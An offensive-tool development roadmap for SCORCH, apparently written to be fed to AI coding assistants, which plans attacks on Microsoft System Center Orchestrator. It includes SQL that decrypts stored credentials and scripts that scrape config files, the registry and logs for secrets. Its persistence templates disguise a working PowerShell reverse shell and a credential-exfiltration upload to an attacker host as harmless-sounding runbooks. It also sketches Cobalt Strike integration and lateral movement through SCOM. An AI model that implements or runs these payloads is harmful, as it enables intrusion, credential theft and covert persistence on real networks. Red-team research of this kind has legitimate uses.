# SCORCH Offensive Security Tool - Research & Development Plan

## Project Overview

**Repository:** https://github.com/professor-moody/scorch  
**Language:** Go  
**Purpose:** Offensive security toolkit for Microsoft System Center Orchestrator  
**Current Version:** v2.0.1

This document provides a comprehensive development roadmap for extending the SCORCH tool with new offensive capabilities. It is designed to be consumed by AI coding assistants (Cursor, Windsurf, etc.) or human developers.

---

## Current Tool Architecture

### Existing Commands

| Command | File Location | Description |
|---------|---------------|-------------|
| `assess` | `cmd/scorch/assess.go` | Security assessment (anon access, NTLM relay, TLS) |
| `enum` | `cmd/scorch/enum.go` | API enumeration (runbooks, servers, folders, jobs) |
| `exec` | `cmd/scorch/exec.go` | Execute runbooks with parameters |
| `dump` | `cmd/scorch/dump.go` | Credential extraction from SQL database |
| `spray` | `cmd/scorch/spray.go` | Password spraying against web service |
| `discover` | `cmd/scorch/discover.go` | Port scan, LDAP, SPN discovery |

### Project Structure

```
scorch/
├── cmd/scorch/
│   ├── main.go           # Entry point, command routing
│   ├── assess.go         # Security assessment
│   ├── enum.go           # API enumeration
│   ├── exec.go           # Runbook execution
│   ├── dump.go           # Credential dumping
│   ├── spray.go          # Password spraying
│   ├── discover.go       # Network discovery
│   └── common.go         # Shared utilities
├── internal/
│   └── auth/
│       └── auth.go       # Authentication handlers (NTLM, Kerberos, etc.)
├── dist/                 # Compiled binaries
├── go.mod
├── go.sum
└── README.md
```

### Authentication Support (Already Implemented)

- Anonymous
- HTTP Basic
- NTLM (cross-platform via go-ntlmssp)
- Pass-the-Hash
- Kerberos (password, ccache, keytab)

---

## New Feature Specifications

### Feature 1: Local Triage (`local` command)

**Priority:** P1 - High Impact  
**Effort:** Medium  
**Purpose:** Post-exploitation enumeration when already on a SCORCH server

#### Command Interface

```
scorch local triage              # Full local enumeration
scorch local services            # Service accounts only
scorch local registry            # Registry keys only
scorch local config              # Configuration files only
scorch local ips                 # Installed Integration Packs
scorch local logs                # Parse log files for secrets
```

#### Registry Keys to Enumerate

```go
// internal/local/registry.go

package local

var OrchestratorRegistryKeys = []string{
    // Main installation
    `SOFTWARE\Microsoft\System Center\2012\Orchestrator`,
    
    // Component-specific keys
    `SOFTWARE\Microsoft\Microsoft System Center 2012\Orchestrator\ManagementService`,
    `SOFTWARE\Microsoft\Microsoft System Center 2012\Orchestrator\RunbookService`,
    `SOFTWARE\Microsoft\Microsoft System Center 2012\Orchestrator\WebService`,
    `SOFTWARE\Microsoft\Microsoft System Center 2012\Orchestrator\DataStore`,
    
    // Database connection info often here
    `SOFTWARE\Microsoft\Microsoft System Center 2012\Orchestrator\Database`,
    
    // Orchestrator 2019/2022 paths
    `SOFTWARE\Microsoft\System Center\Orchestrator`,
}

// Values to extract from registry
type RegistryFindings struct {
    InstallPath        string
    DatabaseServer     string
    DatabaseName       string
    WebServiceURL      string
    ManagementServer   string
    ServiceAccount     string
    Version            string
}

func EnumerateRegistry() (*RegistryFindings, error) {
    // Implementation: Use golang.org/x/sys/windows/registry
    // Iterate through keys, extract values
    // Return structured findings
}
```

#### Windows Services to Query

```go
// internal/local/services.go

package local

var OrchestratorServices = []string{
    "orunbook",     // Orchestrator Runbook Service
    "omanagement",  // Orchestrator Management Service  
    "oremoting",    // Orchestrator Remoting Service
    "omonitor",     // Runbook Server Monitor
}

type ServiceInfo struct {
    Name           string
    DisplayName    string
    State          string
    StartType      string
    ServiceAccount string  // Critical - this is the privileged account
    BinaryPath     string
}

func EnumerateServices() ([]ServiceInfo, error) {
    // Use golang.org/x/sys/windows/svc/mgr
    // Query each service for configuration
    // Extract service account (Log On As)
}
```

#### Configuration Files to Parse

```go
// internal/local/config.go

package local

var ConfigFilePaths = []string{
    // Web service config
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Web Service\web.config`,
    `%ProgramFiles(x86)%\Microsoft System Center\Orchestrator\Web Service\web.config`,
    
    // Management server config
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Management Server\ManagementService.exe.config`,
    
    // Runbook server config  
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Runbook Server\RunbookService.exe.config`,
    
    // Orchestration console config
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Orchestration Console\OrchestratorConsole.exe.config`,
}

type ConfigFindings struct {
    ConnectionStrings []ConnectionString
    AppSettings       map[string]string
    ServiceEndpoints  []string
}

type ConnectionString struct {
    Name             string
    Server           string
    Database         string
    IntegratedAuth   bool
    Username         string  // If SQL auth
    Password         string  // If SQL auth (jackpot!)
}

func ParseConfigFiles() (*ConfigFindings, error) {
    // Parse XML config files
    // Extract <connectionStrings> section
    // Extract <appSettings> section
    // Look for hardcoded credentials
}
```

#### Integration Pack Enumeration

```go
// internal/local/integrationpacks.go

package local

var IPInstallPaths = []string{
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Integration Packs`,
    `%ProgramFiles(x86)%\Microsoft System Center\Orchestrator\Integration Packs`,
    `%ProgramFiles%\Common Files\Microsoft System Center\Orchestrator\Extensions\Support\Integration Packs`,
}

type IntegrationPack struct {
    Name        string
    Version     string
    Publisher   string
    DLLPath     string
    ConfigPath  string
}

// Known high-value IPs
var HighValueIPs = []string{
    "Active Directory",
    "Exchange Admin", 
    "Exchange User",
    "System Center Operations Manager",
    "System Center Configuration Manager", 
    "System Center Virtual Machine Manager",
    "VMware vSphere",
    "Azure",
    "SQL Server",
    "REST",
    "SSH",
}

func EnumerateIntegrationPacks() ([]IntegrationPack, error) {
    // Scan IP directories
    // Parse .oip files (they're ZIP archives with XML manifests)
    // Extract metadata
}
```

#### Log File Analysis

```go
// internal/local/logs.go

package local

var LogPaths = []string{
    `%ProgramData%\Microsoft System Center\Orchestrator\`,
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Management Server\Logs`,
    `%ProgramFiles%\Microsoft System Center\Orchestrator\Runbook Server\Logs`,
}

// Patterns that indicate credential exposure in logs
var CredentialPatterns = []string{
    `(?i)password\s*[=:]\s*\S+`,
    `(?i)pwd\s*[=:]\s*\S+`,
    `(?i)credential\s*[=:]\s*\S+`,
    `(?i)secret\s*[=:]\s*\S+`,
    `(?i)connectionstring.*password`,
    `(?i)user\s*id\s*[=:]\s*\S+.*password`,
}

func ScanLogsForCredentials() ([]LogFinding, error) {
    // Recursively scan log directories
    // Apply regex patterns
    // Return findings with file/line context
}
```

---

### Feature 2: OIS Export Parser (`parse` command)

**Priority:** P1 - High Impact  
**Effort:** Medium  
**Purpose:** Offline parsing of exported .ois_export files to extract encrypted variables

#### Command Interface

```
scorch parse -f exported.ois                    # Parse and display structure
scorch parse -f exported.ois -vars              # Extract all variables
scorch parse -f exported.ois -encrypted         # Show only encrypted variables
scorch parse -f exported.ois -decrypt -key KEY  # Attempt offline decryption
scorch parse -f exported.ois -json -o vars.json # Export to JSON
```

#### File Format Research

The `.ois_export` format is undocumented XML. Key findings:

```xml
<!-- Root element -->
<ExportData xmlns="http://schemas.microsoft.com/SystemCenter/Orchestrator/2011/11/Export">
  
  <!-- Folder structure -->
  <Folders>
    <Folder>
      <UniqueID>GUID</UniqueID>
      <ParentID>GUID</ParentID>  <!-- Root = 00000000-0000-0000-0000-000000000000 -->
      <Name>Folder Name</Name>
    </Folder>
  </Folders>
  
  <!-- Runbook definitions -->
  <Policies>
    <Policy>
      <UniqueID>GUID</UniqueID>
      <ParentID>GUID</ParentID>
      <Name>Runbook Name</Name>
      <!-- Activities/Objects within -->
    </Policy>
  </Policies>
  
  <!-- Variables (THE GOLDMINE) -->
  <Variables>
    <Variable>
      <UniqueID>GUID</UniqueID>
      <ParentID>GUID</ParentID>  <!-- Root Variables = 00000000-0000-0000-0000-000000000005 -->
      <Name>Variable Name</Name>
      <Value>`d.T.~De/[ENCRYPTED_HEX_DATA]`d.T.~De/</Value>
      <IsEncrypted>true</IsEncrypted>
    </Variable>
  </Variables>
  
</ExportData>
```

#### Special Markers

```go
// internal/parser/markers.go

package parser

const (
    // Encrypted value wrapper
    EncryptedPrefix = "`d.T.~De/"
    EncryptedSuffix = "`d.T.~De/"
    
    // Variable reference (used in runbook activities)
    VariableRefPrefix = "`d.T.~Vb/{"
    VariableRefSuffix = "}`d.T.~Vb/"
    
    // Counter reference
    CounterRefPrefix = "`d.T.~Ct/{"
    CounterRefSuffix = "}`d.T.~Ct/"
    
    // Root folder GUIDs
    RootPoliciesFolder  = "00000000-0000-0000-0000-000000000000"
    RootVariablesFolder = "00000000-0000-0000-0000-000000000005"
    RootSchedulesFolder = "00000000-0000-0000-0000-000000000002"
    RootCountersFolder  = "00000000-0000-0000-0000-000000000006"
)

// Extract encrypted hex data from marker
func ExtractEncryptedData(value string) ([]byte, error) {
    if !strings.HasPrefix(value, EncryptedPrefix) {
        return nil, fmt.Errorf("not an encrypted value")
    }
    
    // Strip markers
    hexData := strings.TrimPrefix(value, EncryptedPrefix)
    hexData = strings.TrimSuffix(hexData, EncryptedSuffix)
    
    // Decode hex
    return hex.DecodeString(hexData)
}

// Resolve variable references in activity parameters
func ResolveVariableRefs(text string, variables map[string]Variable) string {
    // Find all `d.T.~Vb/{GUID}`d.T.~Vb/ patterns
    // Replace with variable values
}
```

#### Parser Implementation

```go
// internal/parser/ois.go

package parser

import (
    "encoding/xml"
    "os"
)

type ExportData struct {
    XMLName   xml.Name   `xml:"ExportData"`
    Folders   []Folder   `xml:"Folders>Folder"`
    Policies  []Policy   `xml:"Policies>Policy"`
    Variables []Variable `xml:"Variables>Variable"`
    Schedules []Schedule `xml:"Schedules>Schedule"`
    Counters  []Counter  `xml:"Counters>Counter"`
}

type Folder struct {
    UniqueID    string `xml:"UniqueID"`
    ParentID    string `xml:"ParentID"`
    Name        string `xml:"Name"`
    Description string `xml:"Description"`
}

type Variable struct {
    UniqueID    string `xml:"UniqueID"`
    ParentID    string `xml:"ParentID"`
    Name        string `xml:"Name"`
    Value       string `xml:"Value"`
    Description string `xml:"Description"`
    IsEncrypted bool   `xml:"IsEncrypted"`
}

type Policy struct {
    UniqueID    string     `xml:"UniqueID"`
    ParentID    string     `xml:"ParentID"`
    Name        string     `xml:"Name"`
    Description string     `xml:"Description"`
    Objects     []Object   `xml:"Object"`
    Links       []Link     `xml:"Link"`
}

type Object struct {
    UniqueID     string      `xml:"UniqueID"`
    Name         string      `xml:"Name"`
    ObjectType   string      `xml:"ObjectType"`
    Parameters   []Parameter `xml:"Parameter"`
}

type Parameter struct {
    Name  string `xml:"Name"`
    Value string `xml:"Value"`  // May contain variable refs or encrypted data
}

func ParseOISFile(filepath string) (*ExportData, error) {
    data, err := os.ReadFile(filepath)
    if err != nil {
        return nil, err
    }
    
    var export ExportData
    if err := xml.Unmarshal(data, &export); err != nil {
        return nil, err
    }
    
    return &export, nil
}

func (e *ExportData) GetEncryptedVariables() []Variable {
    var encrypted []Variable
    for _, v := range e.Variables {
        if v.IsEncrypted || strings.Contains(v.Value, EncryptedPrefix) {
            encrypted = append(encrypted, v)
        }
    }
    return encrypted
}

func (e *ExportData) BuildVariableMap() map[string]Variable {
    m := make(map[string]Variable)
    for _, v := range e.Variables {
        m[v.UniqueID] = v
    }
    return m
}
```

---

### Feature 3: Enhanced Dump Command

**Priority:** P2 - Medium Impact  
**Effort:** Low  
**Purpose:** Targeted credential extraction by Integration Pack type

#### Command Interface

```
scorch dump -t sql.corp.local -all                    # Existing
scorch dump -t sql.corp.local -ip-summary            # List IPs with stored creds
scorch dump -t sql.corp.local -ip AD                 # AD IP credentials only
scorch dump -t sql.corp.local -ip Exchange           # Exchange IP credentials
scorch dump -t sql.corp.local -ip SCOM               # SCOM IP credentials
scorch dump -t sql.corp.local -ip VMware             # vSphere credentials
scorch dump -t sql.corp.local -connections           # All connection objects
```

#### Database Schema Details

```sql
-- FOLDERS table (hierarchy)
CREATE TABLE [dbo].[FOLDERS] (
    [UniqueID]     uniqueidentifier NOT NULL,
    [ParentID]     uniqueidentifier NULL,      -- Root Variables: 00000000-0000-0000-0000-000000000005
    [Name]         nvarchar(256) NOT NULL,
    [Description]  nvarchar(max) NULL,
    [Deleted]      bit NOT NULL DEFAULT 0,
    [Disabled]     bit NOT NULL DEFAULT 0,
    [LastModified] datetime NOT NULL
);

-- OBJECTS table (variables, connections, runbooks metadata)
CREATE TABLE [dbo].[OBJECTS] (
    [UniqueID]     uniqueidentifier NOT NULL,
    [ParentID]     uniqueidentifier NULL,      -- FK to FOLDERS.UniqueID
    [Name]         nvarchar(256) NOT NULL,
    [Description]  nvarchar(max) NULL,
    [ObjectType]   nvarchar(64) NOT NULL,      -- 'Variable', 'Connection', 'Policy', etc.
    [Deleted]      bit NOT NULL DEFAULT 0,
    [LastModified] datetime NOT NULL
);

-- VARIABLES table (actual values)
CREATE TABLE [dbo].[VARIABLES] (
    [UniqueID]     uniqueidentifier NOT NULL,  -- FK to OBJECTS.UniqueID
    [Value]        nvarchar(max) NULL,         -- Encrypted if IsEncrypted=1
    [IsEncrypted]  bit NOT NULL DEFAULT 0
);

-- ACTIONSERVERS table (Runbook servers)
CREATE TABLE [dbo].[ACTIONSERVERS] (
    [UniqueID]     uniqueidentifier NOT NULL,
    [Computer]     nvarchar(256) NOT NULL,
    [IsOnline]     bit NOT NULL,
    [LastModified] datetime NOT NULL
);
```

#### SQL Queries for Extraction

```go
// internal/dump/queries.go

package dump

// Get all encrypted variables with folder path
const QueryEncryptedVariables = `
OPEN SYMMETRIC KEY ORCHESTRATOR_SYM_KEY 
DECRYPTION BY ASYMMETRIC KEY ORCHESTRATOR_ASYM_KEY;

SELECT 
    o.Name AS VariableName,
    f.Name AS FolderName,
    o.Description,
    CONVERT(NVARCHAR(MAX), DECRYPTBYKEY(v.Value)) AS DecryptedValue,
    o.LastModified
FROM [dbo].[VARIABLES] v
INNER JOIN [dbo].[OBJECTS] o ON o.UniqueID = v.UniqueID
LEFT JOIN [dbo].[FOLDERS] f ON o.ParentID = f.UniqueID
WHERE o.Deleted = 0
  AND v.Value IS NOT NULL
ORDER BY f.Name, o.Name;

CLOSE SYMMETRIC KEY ORCHESTRATOR_SYM_KEY;
`

// Get Integration Pack connection configurations
const QueryIPConnections = `
SELECT 
    o.Name AS ConnectionName,
    o.ObjectType,
    o.Description,
    f.Name AS FolderName,
    -- Connection details stored in related tables
    o.UniqueID
FROM [dbo].[OBJECTS] o
LEFT JOIN [dbo].[FOLDERS] f ON o.ParentID = f.UniqueID
WHERE o.ObjectType = 'Connection'
  AND o.Deleted = 0
ORDER BY o.Name;
`

// Identify IPs by connection type patterns
const QueryIPSummary = `
SELECT 
    CASE 
        WHEN o.Name LIKE '%Active Directory%' OR o.Name LIKE '%AD %' THEN 'Active Directory'
        WHEN o.Name LIKE '%Exchange%' THEN 'Exchange'
        WHEN o.Name LIKE '%SCOM%' OR o.Name LIKE '%Operations Manager%' THEN 'SCOM'
        WHEN o.Name LIKE '%SCCM%' OR o.Name LIKE '%ConfigMgr%' OR o.Name LIKE '%Configuration Manager%' THEN 'SCCM'
        WHEN o.Name LIKE '%VMware%' OR o.Name LIKE '%vSphere%' OR o.Name LIKE '%vCenter%' THEN 'VMware'
        WHEN o.Name LIKE '%VMM%' OR o.Name LIKE '%Virtual Machine Manager%' THEN 'VMM'
        WHEN o.Name LIKE '%Azure%' THEN 'Azure'
        WHEN o.Name LIKE '%SQL%' THEN 'SQL Server'
        ELSE 'Other'
    END AS IPType,
    COUNT(*) AS ConnectionCount
FROM [dbo].[OBJECTS] o
WHERE o.ObjectType = 'Connection'
  AND o.Deleted = 0
GROUP BY 
    CASE 
        WHEN o.Name LIKE '%Active Directory%' OR o.Name LIKE '%AD %' THEN 'Active Directory'
        WHEN o.Name LIKE '%Exchange%' THEN 'Exchange'
        WHEN o.Name LIKE '%SCOM%' OR o.Name LIKE '%Operations Manager%' THEN 'SCOM'
        WHEN o.Name LIKE '%SCCM%' OR o.Name LIKE '%ConfigMgr%' OR o.Name LIKE '%Configuration Manager%' THEN 'SCCM'
        WHEN o.Name LIKE '%VMware%' OR o.Name LIKE '%vSphere%' OR o.Name LIKE '%vCenter%' THEN 'VMware'
        WHEN o.Name LIKE '%VMM%' OR o.Name LIKE '%Virtual Machine Manager%' THEN 'VMM'
        WHEN o.Name LIKE '%Azure%' THEN 'Azure'
        WHEN o.Name LIKE '%SQL%' THEN 'SQL Server'
        ELSE 'Other'
    END;
`

// List runbook servers
const QueryRunbookServers = `
SELECT Computer, IsOnline, LastModified 
FROM [dbo].[ACTIONSERVERS]
ORDER BY Computer;
`
```

---

### Feature 4: Enhanced LDAP Discovery

**Priority:** P2 - Medium Impact  
**Effort:** Low  
**Purpose:** Better AD reconnaissance for SCORCH infrastructure

#### Additional LDAP Queries

```go
// internal/discover/ldap.go

package discover

// LDAP filters for SCORCH discovery
var LDAPFilters = map[string]string{
    // Built-in Orchestrator groups (created during install)
    "builtin_groups": `(|(cn=OrchestratorSystemGroup)(cn=OrchestratorUsersGroup)(cn=OrchestratorRemoteConsoleUsers))`,
    
    // Service accounts by SPN
    "spn_orchestrator": `(servicePrincipalName=*Orchestrator*)`,
    "spn_http_81":      `(servicePrincipalName=HTTP/*:81*)`,
    "spn_http_82":      `(servicePrincipalName=HTTP/*:82*)`,
    
    // Service accounts by naming convention
    "naming_convention": `(|(sAMAccountName=*orchestrator*)(sAMAccountName=*scorch*)(sAMAccountName=*sco_*)(sAMAccountName=*runbook*))`,
    
    // Service accounts by description
    "description_orch":    `(&(objectClass=user)(description=*orchestrator*))`,
    "description_runbook": `(&(objectClass=user)(description=*runbook*))`,
    "description_scorch":  `(&(objectClass=user)(description=*scorch*))`,
    
    // Computer accounts
    "computers": `(&(objectClass=computer)(|(cn=*ORCH*)(cn=*SCO*)(cn=*SCORCH*)(cn=*RUNBOOK*)))`,
    
    // SQL Server SPNs (find database servers)
    "spn_mssql": `(servicePrincipalName=MSSQLSvc/*)`,
    
    // Managed Service Accounts
    "msa_orchestrator": `(&(objectClass=msDS-ManagedServiceAccount)(|(cn=*orchestrator*)(cn=*scorch*)))`,
    "gmsa_orchestrator": `(&(objectClass=msDS-GroupManagedServiceAccount)(|(cn=*orchestrator*)(cn=*scorch*)))`,
}

// Attributes to retrieve
var LDAPAttributes = []string{
    "cn",
    "sAMAccountName", 
    "distinguishedName",
    "description",
    "servicePrincipalName",
    "memberOf",
    "pwdLastSet",
    "lastLogon",
    "userAccountControl",
    "operatingSystem",
    "dNSHostName",
}

type LDAPFinding struct {
    Type        string   // "group", "user", "computer", "msa"
    Name        string
    DN          string
    Description string
    SPNs        []string
    MemberOf    []string
    Attributes  map[string]interface{}
}

func EnhancedLDAPDiscovery(conn *ldap.Conn, baseDN string) ([]LDAPFinding, error) {
    var findings []LDAPFinding
    
    for filterName, filter := range LDAPFilters {
        results, err := conn.Search(&ldap.SearchRequest{
            BaseDN:     baseDN,
            Scope:      ldap.ScopeWholeSubtree,
            Filter:     filter,
            Attributes: LDAPAttributes,
        })
        if err != nil {
            continue // Some filters may not match anything
        }
        
        for _, entry := range results.Entries {
            finding := LDAPFinding{
                Type:        categorizeEntry(entry),
                Name:        entry.GetAttributeValue("cn"),
                DN:          entry.DN,
                Description: entry.GetAttributeValue("description"),
                SPNs:        entry.GetAttributeValues("servicePrincipalName"),
                MemberOf:    entry.GetAttributeValues("memberOf"),
            }
            findings = append(findings, finding)
        }
    }
    
    return findings, nil
}
```

---

### Feature 5: Runbook Injection/Creation (`new` command)

**Priority:** P3 - High Impact but Complex  
**Effort:** High  
**Purpose:** Create malicious runbooks for persistence

#### Command Interface

```
scorch new runbook -name "Maintenance Task" -activity script -code "powershell -enc BASE64"
scorch new runbook -name "Health Check" -template reverse-shell -lhost 10.0.0.1 -lport 443
scorch new schedule -runbook GUID -interval 1h
scorch inject -runbook GUID -prepend -activity script -code "beacon callback"
```

#### REST API for Runbook Creation

```go
// internal/api/runbook.go

package api

// Create runbook via API (POST to /Runbooks)
type RunbookCreateRequest struct {
    Name        string `json:"Name"`
    Description string `json:"Description"`
    FolderID    string `json:"FolderId"`    // Parent folder GUID
    CheckedOut  bool   `json:"CheckedOut"`  // Must check out to edit
}

// Job creation to execute runbook
type JobCreateRequest struct {
    RunbookID  string            `json:"RunbookId"`
    Parameters map[string]string `json:"Parameters"`
}

// OData format for job creation (older API)
const JobCreateODataTemplate = `<?xml version="1.0" encoding="utf-8"?>
<entry xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices" 
       xmlns:m="http://schemas.microsoft.com/ado/2007/08/dataservices/metadata" 
       xmlns="http://www.w3.org/2005/Atom">
<content type="application/xml">
<m:properties>
<d:RunbookId type="Edm.Guid">{{.RunbookID}}</d:RunbookId>
<d:Parameters>&lt;Data&gt;{{range $k, $v := .Parameters}}&lt;Parameter&gt;&lt;ID&gt;{{$k}}&lt;/ID&gt;&lt;Value&gt;{{$v}}&lt;/Value&gt;&lt;/Parameter&gt;{{end}}&lt;/Data&gt;</d:Parameters>
</m:properties>
</content>
</entry>`
```

#### Persistence Templates

```go
// internal/templates/persistence.go

package templates

// Pre-built runbook templates for common persistence scenarios
var PersistenceTemplates = map[string]RunbookTemplate{
    "reverse-shell": {
        Name:        "System Health Monitor",
        Description: "Monitors system health metrics",
        Activities: []Activity{
            {
                Type: "Run .NET Script",
                Name: "Check System Status",
                Code: `$client = New-Object System.Net.Sockets.TCPClient('{{.LHOST}}',{{.LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
            },
        },
    },
    "beacon-callback": {
        Name:        "Configuration Validator",
        Description: "Validates system configuration",
        Activities: []Activity{
            {
                Type: "Run Program",
                Name: "Run Validator",
                Program: `C:\Windows\Tasks\config_validator.exe`,
                Arguments: "",
            },
        },
    },
    "credential-dump": {
        Name:        "Security Audit",
        Description: "Performs security audit checks",
        Activities: []Activity{
            {
                Type: "Run .NET Script", 
                Name: "Audit Credentials",
                Code: `# Dump credentials and exfil
$creds = Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\SystemCenter\Orchestrator -Recurse
$creds | Out-File C:\Windows\Temp\audit.log
# Upload to attacker
Invoke-WebRequest -Uri "http://{{.LHOST}}/upload" -Method POST -InFile C:\Windows\Temp\audit.log`,
            },
        },
    },
}
```

---

### Feature 6: BOF Implementations

**Priority:** P3 - Medium Impact  
**Effort:** High  
**Purpose:** Cobalt Strike Beacon Object File integration for in-memory execution

#### BOF Specifications

These would be separate C files compiled with mingw:

```c
// bof-scorch-enum.c
// Enumerate SCORCH via REST API from beacon

#include <windows.h>
#include "beacon.h"

// Minimal HTTP client using WinHTTP
// Query /Orchestrator2012/Orchestrator.svc/Runbooks
// Parse XML response
// Return structured data to beacon

void go(char *args, int len) {
    datap parser;
    char *target;
    int port;
    
    BeaconDataParse(&parser, args, len);
    target = BeaconDataExtract(&parser, NULL);
    port = BeaconDataInt(&parser);
    
    // WinHTTP calls to enumerate
    // BeaconPrintf to output results
}
```

```c
// bof-scorch-dump.c  
// SQL credential extraction from beacon

#include <windows.h>
#include "beacon.h"

// Use OLEDB/ODBC to connect to SQL
// Execute decryption query
// Return credentials to beacon
```

#### Aggressor Script Integration

```
# scorch.cna - Cobalt Strike integration

alias scorch-enum {
    local('$bid $target $port');
    $bid = $1;
    $target = $2;
    $port = iff($3, $3, 81);
    
    btask($bid, "Enumerating SCORCH at $target:$port");
    
    $handle = openf(script_resource("bof-scorch-enum.o"));
    $data = readb($handle, -1);
    closef($handle);
    
    beacon_inline_execute($bid, $data, "go", bof_pack($bid, "zi", $target, $port));
}

alias scorch-dump {
    local('$bid $sqlserver $database');
    $bid = $1;
    $sqlserver = $2;
    $database = iff($3, $3, "Orchestrator");
    
    btask($bid, "Dumping credentials from $sqlserver\\$database");
    
    # Execute BOF
}
```

---

### Feature 7: SCOM Integration

**Priority:** P4 - Situational  
**Effort:** Medium  
**Purpose:** Leverage SCORCH's SCOM Integration Pack for lateral movement

#### Command Interface

```
scorch scom discover         # Find SCOM servers via SCORCH config
scorch scom creds            # Extract SCOM connection credentials
scorch scom agents           # List SCOM managed agents (lateral movement targets)
scorch scom exec -agent HOST -script "whoami"  # Execute via SCOM
```

#### Research Notes

SCORCH commonly manages SCOM via the Integration Pack. SCOM connection creds stored in Orchestrator database can be used to:
- Query SCOM for all managed agents (reconnaissance)
- Execute scripts on managed agents (lateral movement)
- Access SCOM's own credential store

Reference: SpecterOps SCOM research (https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-1/)

---

## Testing Environment

### Ludus Lab Configuration

The tool is being developed against a Ludus cyber range with:

| VM | Role | IP |
|----|------|-----|
| SCORCH-DC | Domain Controller | 10.x.x.10 |
| SCORCH-SQL | SQL Server 2019 (Orchestrator DB) | 10.x.x.11 |
| SCORCH-M | Management Server | 10.x.x.12 |
| SCORCH-RB | Runbook Server | 10.x.x.13 |
| SCORCH-WEB | Web Service/Console | 10.x.x.14 |

### Test Commands

```bash
# Basic connectivity
./scorch assess -t SCORCH-WEB

# Enumeration
./scorch enum -t SCORCH-WEB -d SCORCH -u domainadmin -p 'Password123!' -all

# Credential dump
./scorch dump -t SCORCH-SQL -d SCORCH -u domainadmin -p 'Password123!' -all -decrypt

# Discovery
./scorch discover -t SCORCH-DC -d SCORCH -u domainadmin -p 'Password123!' -all
```

---

## Implementation Priority

| Priority | Feature | Effort | Files to Create/Modify |
|----------|---------|--------|------------------------|
| **P1** | `local triage` | Medium | `cmd/scorch/local.go`, `internal/local/*.go` |
| **P1** | `parse` (OIS parser) | Medium | `cmd/scorch/parse.go`, `internal/parser/*.go` |
| **P2** | Enhanced `dump` | Low | Modify `cmd/scorch/dump.go` |
| **P2** | Enhanced `discover` | Low | Modify `cmd/scorch/discover.go`, `internal/discover/ldap.go` |
| **P3** | `new runbook` | High | `cmd/scorch/new.go`, `internal/api/*.go`, `internal/templates/*.go` |
| **P3** | BOF implementations | High | Separate C project, `bof/*.c` |
| **P4** | SCOM integration | Medium | `cmd/scorch/scom.go`, `internal/scom/*.go` |

---

## Dependencies to Add

```go
// go.mod additions

require (
    golang.org/x/sys v0.x.x           // Windows registry, services
    github.com/go-ldap/ldap/v3 v3.x.x // Already have, enhance usage
    github.com/denisenkom/go-mssqldb  // Already have
)
```

---

## Code Style Guidelines

- Follow existing patterns in the codebase
- Use `cobra` for CLI commands
- Use `internal/` for non-exported packages
- JSON output support for all commands (`-json` flag)
- File output support (`-o` flag)
- Debug mode (`-debug` flag)
- Consistent error handling with `fmt.Errorf`

---

## References

- Fox-IT Orchestrator Decryption: https://github.com/fox-it/Decrypt-OrchestratorSecretVariables
- Fox-IT Blog: https://blog.fox-it.com/2018/05/09/introducing-orchestrator-decryption-tool/
- Microsoft SCORCH Docs: https://learn.microsoft.com/en-us/system-center/orchestrator/
- SpecterOps SCOM Research: https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-1/
- SharpSCCM (reference architecture): https://github.com/Mayyhem/SharpSCCM
